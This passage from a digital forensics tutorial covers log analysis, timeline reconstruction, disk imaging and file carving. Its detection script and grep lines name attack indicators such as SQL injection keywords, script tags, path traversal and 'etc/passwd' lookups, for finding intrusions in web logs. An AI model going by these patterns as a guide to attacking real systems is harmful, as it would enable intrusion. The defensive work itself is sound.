cat > /etc/logstash/conf.d/apache.conf << 'EOF'
input {
  file {
    path => "/var/log/apache2/access.log"
    start_position => "beginning"
  }
}

filter {
  grok {
    match => { "message" => "%{COMBINEDAPACHELOG}" }
  }
  date {
    match => [ "timestamp", "dd/MMM/yyyy:HH:mm:ss Z" ]
  }
  geoip {
    source => "clientip"
  }
}

output {
  elasticsearch {
    hosts => ["localhost:9200"]
    index => "apache-logs-%{+YYYY.MM.dd}"
  }
}
EOF

# Start services
systemctl start elasticsearch
systemctl start logstash
systemctl start kibana
```

**Splunk - Log Analysis Platform**

```bash
# Install Splunk (example for Linux)
wget -O splunk.tgz 'https://download.splunk.com/products/splunk/releases/9.0.0/linux/splunk-9.0.0-Linux-x86_64.tgz'
tar -xvf splunk.tgz -C /opt
/opt/splunk/bin/splunk start --accept-license

# Access web interface: http://localhost:8000

# Add data source
/opt/splunk/bin/splunk add monitor /var/log/auth.log -index security

# Basic Splunk queries:
# Search all events:
# index=security

# Search for failed logins:
# index=security "Failed password"

# Count by source IP:
# index=security "Failed password" | stats count by src_ip | sort -count

# Timeline:
# index=security | timechart count by host
```

**LogParser (Windows)**

```powershell
# Download LogParser from Microsoft

# Query Security Event Log
LogParser.exe -i:EVT "SELECT TimeGenerated, EventID, EventTypeName, SourceName, Strings FROM Security WHERE EventID=4624"

# Export to CSV
LogParser.exe -i:EVT -o:CSV "SELECT * FROM Security" > security_export.csv

# Count events by EventID
LogParser.exe -i:EVT "SELECT EventID, COUNT(*) AS Count FROM Security GROUP BY EventID ORDER BY Count DESC"

# Failed logon attempts
LogParser.exe -i:EVT "SELECT TimeGenerated, EXTRACT_TOKEN(Strings, 5, '|') AS Username, EXTRACT_TOKEN(Strings, 19, '|') AS SourceIP FROM Security WHERE EventID=4625"

# Process creation events
LogParser.exe -i:EVT "SELECT TimeGenerated, EXTRACT_TOKEN(Strings, 5, '|') AS ProcessName FROM Security WHERE EventID=4688"
```

### Suspicious Activity Detection

**Brute Force Detection**

```bash
# Failed SSH attempts
grep "Failed password" /var/log/auth.log | awk '{print $(NF-3)}' | sort | uniq -c | awk '$1 > 10 {print "Potential brute force from: " $2 " (" $1 " attempts)"}'

# Failed web authentication
awk '$9 == 401 || $9 == 403' /var/log/apache2/access.log | awk '{print $1}' | sort | uniq -c | awk '$1 > 20 {print "Potential web brute force from: " $2 " (" $1 " attempts)"}'

# Time-based analysis
python3 << 'EOF'
import re
from collections import defaultdict
from datetime import datetime

failed_attempts = defaultdict(list)

with open('/var/log/auth.log', 'r') as f:
    for line in f:
        if 'Failed password' in line:
            match = re.search(r'(\w+ \d+ \d+:\d+:\d+).*from (\d+\.\d+\.\d+\.\d+)', line)
            if match:
                timestamp = match.group(1)
                ip = match.group(2)
                failed_attempts[ip].append(timestamp)

for ip, attempts in failed_attempts.items():
    if len(attempts) > 5:
        print(f"[!] {ip}: {len(attempts)} failed attempts")
        print(f"    First: {attempts[0]}, Last: {attempts[-1]}")
EOF
```

**Privilege Escalation Detection**

```bash
# Sudo usage
grep "sudo" /var/log/auth.log | grep -v "session"

# User/group modifications
grep -E "useradd|usermod|userdel|groupadd|groupmod" /var/log/auth.log

# SUID/SGID execution (requires auditd)
ausearch -sc execve -sv yes | grep -i "suid\|sgid"

# Windows: Admin logon events
# Event ID 4672: Special privileges assigned to new logon
Get-EventLog -LogName Security -InstanceId 4672 | Select-Object TimeGenerated, Message
```

**Lateral Movement Detection**

```bash
# Multiple SSH connections to different hosts
grep "Accepted" /var/log/auth.log | awk '{print $1, $2, $3, $(NF-3), $(NF-1)}' | sort

# Windows: Event ID 4648 (explicit credentials used)
Get-EventLog -LogName Security -InstanceId 4648 | Select-Object TimeGenerated, ReplacementStrings

# Network connections (requires Sysmon Event ID 3)
# Parse Sysmon logs for outbound connections
```

**Data Exfiltration Detection**

```bash
# Large outbound transfers in Apache logs
awk '{if ($10 > 10000000) print $1, $4, $7, $10}' /var/log/apache2/access.log

# Unusual upload activity (POST requests)
grep "POST" /var/log/apache2/access.log | awk '{print $1, $4, $7}' | sort

# DNS exfiltration (long queries)
grep "query" /var/log/syslog | awk '{if (length($NF) > 50) print}'

# Scheduled tasks creation (Windows Event ID 4698)
Get-EventLog -LogName Security -InstanceId 4698
```

**Persistence Mechanism Detection**

```bash
# Cron jobs
grep "cron" /var/log/syslog | grep -i "session opened"
cat /var/log/cron.log

# Service installations
grep "systemctl\|service" /var/log/syslog | grep -i "enable\|start"

# Windows scheduled tasks
Get-EventLog -LogName Security -InstanceId 4698,4699,4700,4701

# Windows service creation (Event ID 7045)
Get-EventLog -LogName System -InstanceId 7045
```

### Log Tampering Detection

**Detecting Log Manipulation**

```bash
# Check for gaps in log timestamps
awk '{print $1, $2, $3}' /var/log/auth.log | uniq -c

# Detect cleared logs
ls -lh /var/log/auth.log*
# Check if current log is smaller than archived logs

# Check last modification time
stat /var/log/auth.log

# Compare log size with expected growth rate
du -h /var/log/auth.log*

# Check for suspicious entries
# - Logs with exactly 0 bytes
# - Logs modified outside business hours
# - Sudden gaps in Event IDs (Windows)

# Verify log integrity (if signing is enabled)
# For Windows Event Logs with signatures:
# Check-EventLogSignature.ps1 (custom script needed)
```

**File Integrity Monitoring**

```bash
# Using AIDE (Advanced Intrusion Detection Environment)
apt install aide

# Initialize database
aideinit

# Move database
mv /var/lib/aide/aide.db.new /var/lib/aide/aide.db

# Check for changes
aide --check

# Compare against database
aide --compare
```

**Syslog Integrity**

```bash
# Check syslog configuration
cat /etc/rsyslog.conf
cat /etc/syslog-ng/syslog-ng.conf

# Verify remote logging is enabled
grep "@" /etc/rsyslog.conf
# Format: *.* @remote-server:514

# Check log rotation
cat /etc/logrotate.d/rsyslog

# Verify logs are not being deleted prematurely
find /var/log/ -name "*.log" -mtime +7
```

### Automated Log Analysis Script

```bash
#!/bin/bash

OUTPUT_DIR="log_analysis_$(date +%Y%m%d_%H%M%S)"
mkdir -p "$OUTPUT_DIR"

echo "[*] Starting Log Analysis"
echo "========================="

# Authentication Analysis
echo "[+] Analyzing Authentication Logs..." | tee "$OUTPUT_DIR/summary.txt"

# Failed logins
echo "Failed Login Attempts:" | tee -a "$OUTPUT_DIR/summary.txt"
grep "Failed password" /var/log/auth.log | wc -l | tee -a "$OUTPUT_DIR/summary.txt"
grep "Failed password" /var/log/auth.log > "$OUTPUT_DIR/failed_logins.txt"

# Top IPs with failed attempts
echo -e "\nTop 10 IPs with Failed Attempts:" | tee -a "$OUTPUT_DIR/summary.txt"
grep "Failed password" /var/log/auth.log | grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" | sort | uniq -c | sort -rn | head -10 | tee -a "$OUTPUT_DIR/summary.txt"

# Successful logins
echo -e "\nSuccessful Logins:" | tee -a "$OUTPUT_DIR/summary.txt"
grep "Accepted" /var/log/auth.log | wc -l | tee -a "$OUTPUT_DIR/summary.txt"
grep "Accepted" /var/log/auth.log > "$OUTPUT_DIR/successful_logins.txt"

# Sudo usage
echo -e "\nSudo Usage:" | tee -a "$OUTPUT_DIR/summary.txt"
grep "sudo" /var/log/auth.log | grep "COMMAND" | wc -l | tee -a "$OUTPUT_DIR/summary.txt"
grep "sudo" /var/log/auth.log > "$OUTPUT_DIR/sudo_usage.txt"

# User/Group modifications
echo -e "\nUser/Group Modifications:" | tee -a "$OUTPUT_DIR/summary.txt"
grep -E "useradd|usermod|userdel|groupadd|groupmod|groupdel" /var/log/auth.log | tee -a "$OUTPUT_DIR/user_modifications.txt"

# Web Server Analysis
if [ -f /var/log/apache2/access.log ]; then
    echo -e "\n[+] Analyzing Apache Logs..." | tee -a "$OUTPUT_DIR/summary.txt"
    
    # Total requests
    echo "Total Requests:" | tee -a "$OUTPUT_DIR/summary.txt"
    wc -l /var/log/apache2/access.log | tee -a "$OUTPUT_DIR/summary.txt"
    
    # Top 10 IPs
    echo -e "\nTop 10 Requesting IPs:" | tee -a "$OUTPUT_DIR/summary.txt"
    awk '{print $1}' /var/log/apache2/access.log | sort | uniq -c | sort -rn | head -10 | tee -a "$OUTPUT_DIR/summary.txt"
    
    # Top 10 URLs
    echo -e "\nTop 10 Requested URLs:" | tee -a "$OUTPUT_DIR/summary.txt"
    awk '{print $7}' /var/log/apache2/access.log | sort | uniq -c | sort -rn | head -10 | tee -a "$OUTPUT_DIR/summary.txt"
    
    # Error codes
    echo -e "\n4xx Errors:" | tee -a "$OUTPUT_DIR/summary.txt"
    awk '$9 ~ /^4/ {print $9}' /var/log/apache2/access.log | sort | uniq -c | sort -rn | tee -a "$OUTPUT_DIR/summary.txt"
    
    echo -e "\n5xx Errors:" | tee -a "$OUTPUT_DIR/summary.txt"
    awk '$9 ~ /^5/ {print $9}' /var/log/apache2/access.log | sort | uniq -c | sort -rn | tee -a "$OUTPUT_DIR/summary.txt"
    
    # Potential attacks
    echo -e "\n[!] Potential Attack Indicators:" | tee -a "$OUTPUT_DIR/attacks.txt"
    
    # SQL injection
    echo "SQL Injection Attempts:" | tee -a "$OUTPUT_DIR/attacks.txt"
    grep -iE "union|select|insert|update|delete|drop|exec" /var/log/apache2/access.log | wc -l | tee -a "$OUTPUT_DIR/attacks.txt"
    grep -iE "union|select|insert|update|delete|drop|exec" /var/log/apache2/access.log > "$OUTPUT_DIR/sqli_attempts.txt"
    
    # XSS
    echo -e "\nXSS Attempts:" | tee -a "$OUTPUT_DIR/attacks.txt"
    grep -iE "<script|javascript:|onerror|onload" /var/log/apache2/access.log | wc -l | tee -a "$OUTPUT_DIR/attacks.txt"
    
    # Path traversal
    echo -e "\nPath Traversal Attempts:" | tee -a "$OUTPUT_DIR/attacks.txt"
    grep -E "\.\./|\.\.%2F|\.\.%5C" /var/log/apache2/access.log | wc -l | tee -a "$OUTPUT_DIR/attacks.txt"
    
    # Command injection
    echo -e "\nCommand Injection Attempts:" | tee -a "$OUTPUT_DIR/attacks.txt"
    grep -E ";|&&|\||%3B|%26%26|%7C" /var/log/apache2/access.log | wc -l | tee -a "$OUTPUT_DIR/attacks.txt"
fi

# System Log Analysis
echo -e "\n[+] Analyzing System Logs..." | tee -a "$OUTPUT_DIR/summary.txt"

# System errors
echo "System Errors:" | tee -a "$OUTPUT_DIR/summary.txt"
grep -i "error" /var/log/syslog | wc -l | tee -a "$OUTPUT_DIR/summary.txt"
grep -i "error" /var/log/syslog | tail -20 > "$OUTPUT_DIR/system_errors.txt"

# System warnings
echo -e "\nSystem Warnings:" | tee -a "$OUTPUT_DIR/summary.txt"
grep -i "warning" /var/log/syslog | wc -l | tee -a "$OUTPUT_DIR/summary.txt"

# Critical events
echo -e "\nCritical Events:" | tee -a "$OUTPUT_DIR/summary.txt"
grep -iE "critical|fatal|panic" /var/log/syslog | wc -l | tee -a "$OUTPUT_DIR/summary.txt"
grep -iE "critical|fatal|panic" /var/log/syslog > "$OUTPUT_DIR/critical_events.txt"

# Kernel messages
echo -e "\nKernel Issues:" | tee -a "$OUTPUT_DIR/summary.txt"
grep "kernel" /var/log/syslog | grep -iE "error|warning|fail" | wc -l | tee -a "$OUTPUT_DIR/summary.txt"

# Create timeline
echo -e "\n[+] Creating Timeline..."
{
    awk '/Failed password/ {print $1" "$2" "$3",AUTH,Failed Login,"$0}' /var/log/auth.log
    awk '/Accepted/ {print $1" "$2" "$3",AUTH,Successful Login,"$0}' /var/log/auth.log
    awk '/sudo.*COMMAND/ {print $1" "$2" "$3",SUDO,Command Executed,"$0}' /var/log/auth.log
    if [ -f /var/log/apache2/access.log ]; then
        awk '{gsub(/\[|\]/,"",$4); print $4",WEB,HTTP Request,"$0}' /var/log/apache2/access.log
    fi
} | sort > "$OUTPUT_DIR/timeline.csv"

# Summary statistics
echo -e "\n[+] Summary Statistics" | tee -a "$OUTPUT_DIR/summary.txt"
echo "Total Failed Logins: $(grep -c "Failed password" /var/log/auth.log)" | tee -a "$OUTPUT_DIR/summary.txt"
echo "Total Successful Logins: $(grep -c "Accepted" /var/log/auth.log)" | tee -a "$OUTPUT_DIR/summary.txt"
echo "Total Sudo Commands: $(grep -c "sudo.*COMMAND" /var/log/auth.log)" | tee -a "$OUTPUT_DIR/summary.txt"
if [ -f /var/log/apache2/access.log ]; then
    echo "Total HTTP Requests: $(wc -l < /var/log/apache2/access.log)" | tee -a "$OUTPUT_DIR/summary.txt"
fi

echo -e "\n[*] Analysis Complete. Results in: $OUTPUT_DIR"
```

### Log Analysis Best Practices

**Centralized Logging**

```bash
# Configure rsyslog to send logs to central server
cat >> /etc/rsyslog.conf << 'EOF'
# Send all logs to remote server
*.* @log-server.example.com:514

# Or use TCP for reliability
*.* @@log-server.example.com:514
EOF

systemctl restart rsyslog
```

**Log Retention and Rotation**

```bash
# Configure logrotate
cat > /etc/logrotate.d/custom << 'EOF'
/var/log/custom/*.log {
    daily
    rotate 90
    compress
    delaycompress
    missingok
    notifempty
    create 0640 root adm
    sharedscripts
    postrotate
        systemctl reload rsyslog > /dev/null 2>&1 || true
    endscript
}
EOF
```

**Important Notes:**

[Inference] Log analysis effectiveness depends on proper log configuration and retention policies. Incomplete logs significantly reduce forensic capabilities.

[Unverified] Adversaries may clear or tamper with logs to hide their activities. Always check for signs of log manipulation and maintain centralized logging where possible.

**Related Topics**: SIEM integration, threat hunting with logs, behavioral analytics, anomaly detection, log forwarding protocols (syslog, GELF, Beats), compliance logging (PCI-DSS, HIPAA, SOX)

---

## Timeline Analysis

Timeline analysis reconstructs chronological sequences of events using file system timestamps, log entries, and artifact metadata. Understanding temporal relationships between artifacts is crucial for incident reconstruction.

### File System Timestamps

**Linux/Unix Timestamps**:

```bash
# View detailed timestamps
stat filename.txt

# Output includes:
# - Access time (atime): Last file read
# - Modify time (mtime): Last content modification
# - Change time (ctime): Last metadata change (permissions, ownership)
# - Birth time (btime/crtime): File creation [not always available]

# Format timestamp output
stat -c "%n - Access: %x, Modify: %y, Change: %z" filename.txt

# Find files modified in last 24 hours
find /path -mtime -1

# Find files accessed in last 7 days
find /path -atime -7

# Find files changed in last hour
find /path -cmin -60

# Combine time and size criteria
find /path -mtime -7 -size +1M
```

**Windows Timestamps (NTFS)**:

```powershell
# PowerShell - View timestamps
Get-ItemProperty filename.txt | Select-Object Name, CreationTime, LastAccessTime, LastWriteTime

# Detailed NTFS timestamps (includes $STANDARD_INFORMATION and $FILE_NAME)
fsutil usn readjournal C: csv | Select-String "filename.txt"

# Alternative: Get-Item with all properties
Get-Item filename.txt | Format-List *
```

**MACB Timestamps (Windows)**:

- **M**odified: Content change time ($STANDARD_INFORMATION)
- **A**ccessed: Last access time
- **C**reated: File creation time ($FILE_NAME)
- **B**irth: Entry created in MFT

[Inference: NTFS stores timestamps in both $STANDARD_INFORMATION and $FILE_NAME attributes; these can differ due to file operations or timestomping]

### Timeline Generation Tools

**log2timeline/plaso - Comprehensive Timeline Creation**:

```bash
# Install plaso
pip install plaso

# Generate timeline from disk image
log2timeline.py timeline.plaso evidence.dd

# From mounted filesystem
log2timeline.py timeline.plaso /mnt/evidence/

# From specific artifacts
log2timeline.py --parsers "linux,webhist" timeline.plaso /evidence/

# Process timeline with psort
psort.py -o l2tcsv -w timeline.csv timeline.plaso

# Filter by date range
psort.py -o l2tcsv -w filtered.csv timeline.plaso "date > '2025-01-01 00:00:00' AND date < '2025-01-31 23:59:59'"

# Filter by source
psort.py -o dynamic -w output.txt timeline.plaso "source contains 'bash_history'"
```

**mactime (Sleuth Kit) - Traditional Timeline**:

```bash
# Create body file from filesystem
fls -r -m / image.dd > bodyfile.txt

# Generate timeline from body file
mactime -b bodyfile.txt -d -z UTC > timeline.csv

# Filter by date range
mactime -b bodyfile.txt -d 2025-01-01..2025-01-31 > january_timeline.csv

# Specify time zone
mactime -b bodyfile.txt -d -z EST5EDT > timeline_est.csv
```

**timesketch - Collaborative Timeline Analysis**:

```bash
# Install via Docker
docker run -d -p 5000:5000 --name timesketch us-docker.pkg.dev/osdfir-registry/timesketch/timesketch:latest

# Access web interface
# http://localhost:5000

# Import timeline
# Upload plaso timeline file via web UI
# Add tags, comments, and annotations collaboratively
```

### Timestamp Manipulation Detection (Timestomping)

**Detect Anomalies**:

```bash
# Find files where ctime < mtime (suspicious)
find /path -type f -printf "%C@ %T@ %p\n" | awk '$1 < $2 {print $3}'

# Check for round timestamps (often indicates manipulation)
stat -c "%y" * | grep ":00:00.000000000"

# NTFS: Compare $STANDARD_INFORMATION vs $FILE_NAME timestamps
# Use tools like MFTExplorer or analyzeMFT.py
```

**Windows Timestomping Detection**:

```powershell
# Extract MFT for analysis
# Use RawCopy or FTK Imager

# Analyze with MFTExplorer (GUI) or analyzeMFT.py (CLI)
python analyzeMFT.py -f $MFT -o output.csv

# Look for discrepancies between SI and FN timestamps
# Timestomp tool modifies SI but not FN attributes
```

### Log File Timeline Analysis

**Linux System Logs**:

```bash
# Merge and sort multiple log files
cat /var/log/auth.log /var/log/syslog | sort -k1,3

# Extract timestamps and sort
grep "Jan 15" /var/log/* | sort -t: -k1,2

# Parse with specific timestamp format
awk '{print $1, $2, $3, $0}' /var/log/syslog | sort -k1,3

# Filter by time range
awk '$3 >= "10:00:00" && $3 <= "14:00:00"' /var/log/auth.log
```

**Windows Event Logs**:

```powershell
# Query event logs with PowerShell
Get-WinEvent -Path Security.evtx | Where-Object {$_.TimeCreated -gt "2025-01-15"} | Sort-Object TimeCreated

# Export to CSV for timeline
Get-WinEvent -Path System.evtx | Select-Object TimeCreated, Id, Message | Export-Csv -Path timeline.csv

# Filter by Event ID
Get-WinEvent -FilterHashtable @{Path="Security.evtx"; ID=4624,4625} | Format-Table TimeCreated, Message

# Command-line with wevtutil
wevtutil qe Security.evtx /f:text /rd:true /c:100 > security_log.txt
```

**Python Log Parsing Script**:

```python
import re
from datetime import datetime

def parse_log_timeline(logfile):
    timeline = []
    
    # Common timestamp patterns
    patterns = [
        r'(\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2})',  # ISO format
        r'([A-Z][a-z]{2}\s+\d{1,2}\s+\d{2}:\d{2}:\d{2})',  # Syslog format
        r'(\d{2}/[A-Z][a-z]{2}/\d{4}:\d{2}:\d{2}:\d{2})',  # Apache format
    ]
    
    with open(logfile, 'r', errors='ignore') as f:
        for line in f:
            for pattern in patterns:
                match = re.search(pattern, line)
                if match:
                    timestamp = match.group(1)
                    timeline.append((timestamp, line.strip()))
                    break
    
    # Sort by timestamp
    timeline.sort(key=lambda x: x[0])
    
    return timeline

# Usage
timeline = parse_log_timeline('/var/log/syslog')
for ts, event in timeline:
    print(f"{ts}: {event}")
```

### Web Server Access Log Timeline

**Apache/Nginx Access Logs**:

```bash
# Sort by timestamp
sort -t' ' -k4 access.log

# Extract specific time range
awk -F'[\\[\\]]' '{print $2}' access.log | awk '$1 >= "01/Jan/2025:10:00:00" && $1 <= "01/Jan/2025:14:00:00"' access.log

# Count requests per hour
awk '{print $4}' access.log | cut -d: -f2 | sort | uniq -c | sort -n

# Timeline with IP and requested resource
awk '{print $4, $1, $7}' access.log | sort

# Detect suspicious patterns
grep -E "\.\.\/|etc\/passwd|select.*from|union.*select" access.log
```

**Browser History Timeline**:

```bash
# Chrome history (SQLite database)
sqlite3 ~/.config/google-chrome/Default/History "SELECT datetime(last_visit_time/1000000-11644473600,'unixepoch'), url, title FROM urls ORDER BY last_visit_time;"

# Firefox history
sqlite3 ~/.mozilla/firefox/*.default-release/places.sqlite "SELECT datetime(last_visit_date/1000000,'unixepoch'), url, title FROM moz_places ORDER BY last_visit_date;"

# Export to CSV
sqlite3 -header -csv History "SELECT datetime(last_visit_time/1000000-11644473600,'unixepoch') as timestamp, url, title, visit_count FROM urls ORDER BY last_visit_time;" > browser_timeline.csv
```

### Email Timeline Analysis

**Parse Email Headers**:

```bash
# Extract timestamps from email headers
grep "^Date:\|^Received:" email.eml | head -20

# Parse with Python
python3 << 'EOF'
import email
from email import policy

with open('email.eml', 'rb') as f:
    msg = email.message_from_binary_file(f, policy=policy.default)
    print(f"Date: {msg['Date']}")
    print(f"From: {msg['From']}")
    print(f"Subject: {msg['Subject']}")
    
    # Trace email path via Received headers
    for received in msg.get_all('Received', []):
        print(f"Received: {received}")
EOF
```

### Super Timeline Creation

**Combine Multiple Sources**:

```bash
# Create comprehensive timeline with plaso
log2timeline.py \
    --parsers "linux,apache_access,bash_history,chrome_history,syslog" \
    --storage-file super_timeline.plaso \
    /mnt/evidence/

# Add additional sources
log2timeline.py \
    --storage-file super_timeline.plaso \
    --append \
    /mnt/evidence/additional_data/

# Export with filtering
psort.py \
    -o l2tcsv \
    -w super_timeline.csv \
    super_timeline.plaso \
    "date > '2025-01-01' AND date < '2025-02-01'"
```

**Timeline Analysis Workflow**:

1. **Collection**: Gather all temporal artifacts (files, logs, registry, browser history)
2. **Normalization**: Convert to common format and timezone
3. **Correlation**: Identify related events across sources
4. **Filtering**: Focus on relevant timeframes
5. **Visualization**: Create graphical representations
6. **Investigation**: Identify anomalies and patterns

## File System Forensics

File system forensics examines storage structures, metadata, and allocation patterns to recover evidence and understand user activity.

### Disk Image Acquisition

**Linux dd - Traditional Imaging**:

```bash
# Create disk image
dd if=/dev/sdb of=evidence.dd bs=4M status=progress

# Create compressed image
dd if=/dev/sdb bs=4M status=progress | gzip > evidence.dd.gz

# With error handling (ddrescue preferred for damaged media)
ddrescue /dev/sdb evidence.dd logfile.txt

# Verify image integrity
md5sum /dev/sdb > original.md5
md5sum evidence.dd > image.md5
diff original.md5 image.md5
```

**dc3dd - Enhanced Forensic Imaging**:

```bash
# Image with hash verification
dc3dd if=/dev/sdb of=evidence.dd hash=md5 hash=sha256 log=imaging.log

# Split output into chunks
dc3dd if=/dev/sdb of=evidence.dd ofsz=2G hash=md5

# Multiple output destinations
dc3dd if=/dev/sdb of=evidence1.dd of=evidence2.dd hash=md5
```

**ewfacquire - Expert Witness Format (E01)**:

```bash
# Create E01 image (industry standard format)
ewfacquire /dev/sdb

# Prompts for:
# - Case information
# - Evidence details
# - Compression level
# - Output filename

# Verify E01 image
ewfverify evidence.E01

# Mount E01 image
ewfmount evidence.E01 /mnt/ewf/
mount -o ro,loop /mnt/ewf/ewf1 /mnt/evidence/
```

**FTK Imager (Windows)** [Commercial/Proprietary]:

- GUI-based disk imaging
- Creates E01, DD, or proprietary AD1 formats
- Built-in hash verification
- Can image physical drives, logical volumes, or specific folders

### File System Structure Analysis

**Sleuth Kit - Comprehensive Forensic Suite**:

**fsstat - File System Information**:

```bash
# Analyze filesystem structure
fsstat evidence.dd

# Output includes:
# - File system type
# - Volume label
# - Sector sizes
# - Cluster/block sizes
# - Inode/MFT details
# - Timestamps (creation, mount times)
```

**fls - List Files and Directories**:

```bash
# List all files (allocated and deleted)
fls -r evidence.dd

# Include deleted files
fls -rd evidence.dd

# Long format with timestamps
fls -l -r evidence.dd

# List specific inode/MFT entry
fls evidence.dd <inode>

# Output to body file for timeline
fls -r -m / evidence.dd > bodyfile.txt
```

**icat - Extract File by Inode**:

```bash
# Extract file content by inode
icat evidence.dd 123456 > extracted_file.dat

# Extract deleted file
icat -r evidence.dd 123456 > recovered_file.dat

# Extract alternate data streams (NTFS)
icat evidence.dd 123456:stream_name > ads_content.dat
```

**istat - Inode/MFT Entry Details**:

```bash
# Display inode metadata
istat evidence.dd 123456

# Shows:
# - File type
# - Permissions
# - Owner/Group
# - Size
# - Timestamps (MAC times)
# - Block allocation
# - Data runs (NTFS)
```

**ils - List Inodes**:

```bash
# List all inodes
ils evidence.dd

# List only deleted inodes
ils -e evidence.dd

# Include orphan files (files in unallocated space)
ils -o evidence.dd

# Combine with mactime for deleted file timeline
ils -m evidence.dd > deleted_bodyfile.txt
mactime -b deleted_bodyfile.txt > deleted_timeline.csv
```

### NTFS-Specific Forensics

**MFT (Master File Table) Analysis**:

**analyzeMFT.py - MFT Parser**:

```bash
# Extract $MFT from image
icat -o 2048 evidence.dd 0 > $MFT

# Parse MFT to CSV
python analyzeMFT.py -f $MFT -o mft_analysis.csv

# Analyze output for:
# - Deleted files (FILE0 records)
# - Timestomping (SI vs FN timestamp mismatches)
# - Alternate Data Streams
# - File fragments
```

**MFTExplorer (Windows GUI)** [Commercial/Free]:

```
# Load $MFT file
# Provides visual interface to:
# - Browse MFT entries
# - Compare timestamps
# - Identify anomalies
# - Export specific records
```

**NTFS USN Journal Analysis**:

```bash
# Extract USN Journal
icat evidence.dd [MFT entry for $Extend\$UsnJrnl:$J] > usnjrnl.dat

# Parse USN Journal with usn.py
python usn.py -f usnjrnl.dat -o usn_records.csv

# Shows:
# - File operations (create, delete, rename, modify)
# - Timestamps for each operation
# - Original and new filenames (for renames)
```

**Alternate Data Streams Recovery**:

```bash
# List all streams in image
fls -r -u evidence.dd | grep ":"

# Extract ADS content
icat evidence.dd [inode]:stream_name > ads_extracted.dat

# Example: Extract zone identifier
icat evidence.dd 123456:Zone.Identifier
```

### Ext4-Specific Forensics

**ext4magic - Deleted File Recovery for Ext4**:

```bash
# List deleted files
ext4magic evidence.dd -a $(date -d "-1 day" +%s) -f deleted_files.txt

# Recover deleted file by inode
ext4magic evidence.dd -r -f /path/to/deleted/file.txt

# Recover all deleted files in directory
ext4magic evidence.dd -r -d /home/user/Documents/ -m
```

**debugfs - Ext Filesystem Debugger**:

```bash
# Interactive mode
debugfs evidence.dd

# List deleted inodes
debugfs: lsdel

# Display inode information
debugfs: stat <inode>

# Dump file content
debugfs: dump <inode> /tmp/recovered_file

# List directory contents
debugfs: ls /path/to/directory
```

### Partition and Volume Analysis

**mmls - Display Partition Layout**:

```bash
# Show partition table
mmls evidence.dd

# Output shows:
# - Partition number
# - Start sector
# - End sector
# - Length
# - Description

# Calculate offset for mounting specific partition
# offset = start_sector * sector_size (usually 512)
```

**mount - Mount Disk Image**:

```bash
# Mount entire disk image
mount -o ro,loop evidence.dd /mnt/evidence/

# Mount specific partition (calculate offset)
mount -o ro,loop,offset=$((2048*512)) evidence.dd /mnt/evidence/

# Mount with specific filesystem type
mount -t ntfs-3g -o ro,loop,offset=$((2048*512)) evidence.dd /mnt/evidence/

# Mount E01 images (requires ewfmount)
ewfmount evidence.E01 /mnt/ewf/
mount -o ro,loop,offset=$((2048*512)) /mnt/ewf/ewf1 /mnt/evidence/
```

**kpartx - Kernel Partition Mapper**:

```bash
# Map partitions from disk image
kpartx -av evidence.dd

# Creates /dev/mapper/loopXpY devices for each partition

# Mount partition
mount -o ro /dev/mapper/loop0p1 /mnt/evidence/

# Unmap when done
kpartx -dv evidence.dd
```

### File Carving and Unallocated Space

**File Carving Concepts**:

- Searches for file signatures (magic bytes) in raw data
- Recovers files from unallocated space, slack space, or fragmented areas
- Does not rely on file system metadata

**Foremost - Header/Footer Carving**:

```bash
# Carve all supported file types
foremost -i evidence.dd -o carved_output/

# Carve specific file types
foremost -t jpg,png,pdf,doc -i evidence.dd -o output/

# Use custom configuration
foremost -c custom.conf -i evidence.dd -o output/

# Configuration file format (/etc/foremost.conf):
# jpg    y    200000    \xff\xd8\xff    \xff\xd9
```

**Scalpel - Improved Carving**:

```bash
# Configure file types in /etc/scalpel/scalpel.conf
# Uncomment desired file types

# Carve files
scalpel evidence.dd -o carved_output/

# Use specific configuration
scalpel -c custom.conf evidence.dd -o output/

# Preview mode (don't write files)
scalpel -p evidence.dd -o output/
```

**PhotoRec - File Recovery Tool**:

```bash
# Interactive mode
photorec evidence.dd

# Command-line mode
photorec /log /d recovered_files/ evidence.dd

# Specify file types
photorec /d recovered_files/ /cmd evidence.dd fileopt,everything,disable,jpg,enable,png,enable,search
```

**bulk_extractor - Advanced Carving and Analysis**:

```bash
# Extract features from disk image
bulk_extractor -o output/ evidence.dd

# Outputs:
# - email.txt: Email addresses
# - url.txt: URLs
# - telephone.txt: Phone numbers
# - ccn.txt: Credit card numbers
# - zip.txt: Compressed files
# - exif.txt: EXIF data from images

# Specify extractors
bulk_extractor -E email -E url -o output/ evidence.dd

# Process specific offset range
bulk_extractor -o output/ -O 1000000 -B 10000000 evidence.dd
```

### Slack Space Analysis

**Slack Space Types**:

- **RAM Slack**: Space between EOF and end of sector
- **Drive Slack**: Space between last sector of file and end of cluster

**Extract Slack Space**:

```bash
# Using blkls (Sleuth Kit)
blkls evidence.dd > unallocated_space.dd

# Search slack space for strings
strings -a unallocated_space.dd | grep -i "password\|secret\|confidential"

# Carve slack space
foremost -i unallocated_space.dd -o carved_slack/
```

### Journal Analysis

**Ext3/Ext4 Journal**:

```bash
# Locate journal
debugfs evidence.dd
debugfs: logdump

# Export journal for analysis
debugfs -R "logdump -a" evidence.dd > journal_dump.txt

# Parse journal entries
# Contains records of file system transactions
# Useful for recovering recently deleted files
```

**NTFS $LogFile Analysis**:

```bash
# Extract $LogFile
icat evidence.dd 2 > $LogFile

# Parse with LogFileParser or similar tools
# Contains transaction logs of file system operations
# Can reveal file operations even after deletion
```

### File System Comparison

**Compare Disk Images**:

```bash
# Binary comparison
cmp evidence1.dd evidence2.dd

# Detailed difference
diff <(xxd evidence1.dd) <(xxd evidence2.dd)

# Hash-based comparison
md5deep -r /mnt/evidence1/ > baseline.txt
md5deep -r -X baseline.txt /mnt/evidence2/
```

**File Integrity Monitoring**:

```bash
# Create baseline hash database
md5deep -r /directory/ > baseline_hashes.txt

# Compare against baseline
md5deep -r -X baseline_hashes.txt /directory/

# Using sha256
sha256deep -r /directory/ > sha256_baseline.txt
```

## Deleted File Recovery

Deleted file recovery exploits the fact that file deletion typically only removes directory entries and marks space as available, leaving actual data intact until overwritten.

### Understanding File Deletion

**Linux Deletion Process**:

1. Directory entry removed
2. Inode marked as available
3. Data blocks marked as unallocated
4. Actual data remains until overwritten

**Windows Deletion Process**:

1. MFT entry marked as deleted (FILE0 record)
2. Clusters marked as available in $Bitmap
3. Data remains in place until overwritten
4. Recycle Bin may retain copy

### Basic Recovery Techniques

